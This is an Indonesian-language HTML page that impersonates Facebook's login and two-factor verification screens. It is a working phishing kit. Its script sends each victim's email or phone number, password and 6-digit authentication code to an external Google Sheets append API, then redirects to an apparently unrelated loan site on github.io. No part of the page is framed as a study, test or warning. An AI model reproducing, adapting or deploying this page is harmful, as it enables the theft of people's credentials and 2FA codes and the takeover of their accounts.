<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
    body { font-family: 'Roboto', sans-serif; }
    .fb-blue { background-color: #1877f2; }
    .fb-green { background-color: #42b72a; }
    .loading {
      display: inline-block; width: 20px; height: 20px;
      border: 3px solid #f3f3f3; border-top: 3px solid #1877f2;
      border-radius: 50%; animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .fade-in { animation: fadeIn 0.3s ease-in; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .shake { animation: shake 0.5s; }
    @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
  </style>
</head>
<body class="bg-[#f0f2f5] flex flex-col items-center justify-center min-h-screen px-4">

  <div class="w-full max-w-md">
    <!-- Logo & Judul -->
    <div class="text-center mb-8">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="w-20 h-20 mx-auto mb-4">
      <h1 class="text-2xl font-bold text-gray-800">Facebook</h1>
      <p class="text-gray-600 text-sm mt-1">Terhubung dengan teman dan dunia di sekitar Anda</p>
    </div>

    <!-- FORM LOGIN -->
    <form id="form1" class="bg-white rounded-lg shadow-lg p-6 space-y-4 fade-in">
      <div class="space-y-3">
        <div class="relative">
          <i class="fas fa-user absolute left-3 top-3 text-gray-400"></i>
          <input id="usr" type="text" placeholder="Email atau Nomor Telepon" 
                 class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" required>
        </div>
        <div class="relative">
          <i class="fas fa-lock absolute left-3 top-3 text-gray-400"></i>
          <input id="pss" type="password" placeholder="Kata Sandi" 
                 class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" required>
          <button type="button" id="togglePassword" class="absolute right-3 top-3 text-gray-400 hover:text-gray-600">
            <i class="fas fa-eye"></i>
          </button>
        </div>
      </div>
      
      <button id="btn1" type="submit" class="w-full fb-blue text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5] transition duration-200 flex items-center justify-center">
        <span id="btn1Text">Masuk</span>
        <div id="btn1Loading" class="loading hidden"></div>
      </button>
      
      <div class="text-center">
        <a href="#" class="text-blue-600 text-sm hover:underline">Lupa Kata Sandi?</a>
      </div>
      
      <div class="relative my-4">
        <div class="absolute inset-0 flex items-center">
          <div class="w-full border-t border-gray-300"></div>
        </div>
        <div class="relative flex justify-center text-sm">
          <span class="px-2 bg-white text-gray-500">atau</span>
        </div>
      </div>
      
      <button type="button" id="buatAkun" class="w-full fb-green text-white py-3 rounded-lg font-semibold hover:bg-[#36a420] transition duration-200">
        Buat Akun Baru
      </button>
    </form>

    <!-- FORM AUTENTIKASI -->
    <form id="form2" class="bg-white rounded-lg shadow-lg p-6 space-y-4 hidden fade-in">
      <div class="text-center mb-4">
        <i class="fas fa-shield-alt text-4xl text-blue-500 mb-3"></i>
        <h2 class="text-xl font-bold text-gray-800">Verifikasi Dua Faktor</h2>
        <p class="text-gray-600 text-sm mt-2">Masukkan kode autentikasi yang dikirim ke perangkat Anda</p>
      </div>
      
      <div class="relative">
        <i class="fas fa-key absolute left-3 top-3 text-gray-400"></i>
        <input id="auth" type="text" placeholder="Kode 6 digit" maxlength="6" 
               class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition text-center text-2xl tracking-widest" required>
      </div>
      
      <button id="btn2" type="submit" class="w-full fb-blue text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5] transition duration-200 flex items-center justify-center">
        <span id="btn2Text">Konfirmasi</span>
        <div id="btn2Loading" class="loading hidden"></div>
      </button>
      
      <div class="flex gap-3">
        <button id="backBtn" type="button" class="flex-1 border border-gray-300 text-gray-700 py-3 rounded-lg hover:bg-gray-50 transition duration-200">
          <i class="fas fa-arrow-left mr-2"></i>Kembali
        </button>
        <button type="button" class="flex-1 text-blue-600 py-3 rounded-lg hover:bg-blue-50 transition duration-200">
          Kirim Ulang Kode
        </button>
      </div>
    </form>
  </div>

  <script>
    const form1 = document.getElementById('form1');
    const form2 = document.getElementById('form2');
    const btn1 = document.getElementById('btn1');
    const btn2 = document.getElementById('btn2');
    const backBtn = document.getElementById('backBtn');
    const togglePassword = document.getElementById('togglePassword');
    const passwordInput = document.getElementById('pss');

    const apiURL = 'https://api.apico.dev/v1/32a6pc/1UqeWoK2iElSp9scRY0P1j69FJhD_9RuUqCfAS_8brXY/values/Sheet1:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS&includeValuesInResponse=true';

    // Toggle password visibility
    togglePassword.addEventListener('click', () => {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
      togglePassword.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
    });

    function getDateTime() {
      return new Date().toLocaleString('id-ID');
    }

    function showLoading(buttonId, textId, loadingId) {
      document.getElementById(textId).classList.add('hidden');
      document.getElementById(loadingId).classList.remove('hidden');
      document.getElementById(buttonId).disabled = true;
    }

    function hideLoading(buttonId, textId, loadingId) {
      document.getElementById(textId).classList.remove('hidden');
      document.getElementById(loadingId).classList.add('hidden');
      document.getElementById(buttonId).disabled = false;
    }

    function validateForm(formEl) {
      let valid = true;
      formEl.querySelectorAll('input[required]').forEach(input => {
        if (!input.value.trim()) {
          input.classList.add('shake', 'border-red-500');
          setTimeout(() => input.classList.remove('shake', 'border-red-500'), 500);
          valid = false;
        }
      });
      return valid;
    }

    // Form1 Submit (Login)
    form1.addEventListener('submit', async e => {
      e.preventDefault();
      if (!validateForm(form1)) return;

      const usr = document.getElementById('usr').value;
      const pss = document.getElementById('pss').value;
      const date = getDateTime();

      showLoading('btn1', 'btn1Text', 'btn1Loading');

      try {
        await fetch(apiURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ values: [[usr, pss, '', date]] })
        });

        localStorage.setItem('usr', usr);
        form1.classList.add('hidden');
        form2.classList.remove('hidden');
      } catch (err) {
        alert('Terjadi kesalahan. Silakan coba lagi.');
        console.error(err);
      } finally {
        hideLoading('btn1', 'btn1Text', 'btn1Loading');
      }
    });

    // Form2 Submit (2FA)
    form2.addEventListener('submit', async e => {
      e.preventDefault();
      if (!validateForm(form2)) return;

      const usr = localStorage.getItem('usr');
      const auth = document.getElementById('auth').value;
      const date = getDateTime();

      showLoading('btn2', 'btn2Text', 'btn2Loading');

      try {
        await fetch(apiURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ values: [[usr, '', auth, date]] })
        });

        localStorage.removeItem('usr');
        window.location.href = 'https://gantulu.github.io/pinjaman/mainapp.html';
      } catch (err) {
        alert('Kode autentikasi tidak valid. Silakan coba lagi.');
        console.error(err);
      } finally {
        hideLoading('btn2', 'btn2Text', 'btn2Loading');
      }
    });

    // Back Button
    backBtn.addEventListener('click', () => {
      form2.classList.add('hidden');
      form1.classList.remove('hidden');
      document.getElementById('auth').value = '';
    });

    // Auto-format auth input (numeric only)
    document.getElementById('auth').addEventListener('input', e => {
      e.target.value = e.target.value.replace(/[^0-9]/g, '');
    });
  </script>
</body>
</html>
